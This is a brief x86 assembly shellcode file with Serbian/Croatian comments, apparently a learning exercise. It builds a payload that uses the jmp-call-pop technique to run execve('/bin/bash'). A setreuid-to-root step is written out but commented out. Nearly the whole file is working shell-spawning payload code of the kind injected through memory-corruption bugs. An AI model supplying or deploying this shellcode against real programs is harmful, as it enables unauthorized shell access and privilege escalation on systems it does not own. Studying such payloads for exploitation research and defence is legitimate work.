BITS 32
section .data
global _start

_start:
; Postavimo na root (ako moze super) pa otvorimo shell

; fja int setreuid(uid_t ruid, uid_t euid);
; man setreuird 2 argumenta , stavljamo ih na stack u obrnutom redosledu !


; first we need to find the function number for that

;include/asm-i386/unistd.h.
; kod mene /usr/include/asm

; mi kompajliramo kao 32 bita stoga koristimo 32bitne syscall brojeve naredbi

;#define __NR_setreuid 70


; Here i use alternative syscall methods (not with stack but regs)
; Used order is EBX ECX EDX ESI EDI EBP

;cleaning

;xor eax,eax
;xor ebx,ebx

;mov al,70
;xor ebx,ebx
;int 0x80

; Now to call execve
; int execve(const char *filename, char *const argv[],char *const envp[]);
; eax =11

;cleaning
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

jmp short message

getback:
pop ebx
mov al,11
xor ecx,ecx
xor edx,edx
int 0x80

message:
	call getback
	db "/bin/bash",0
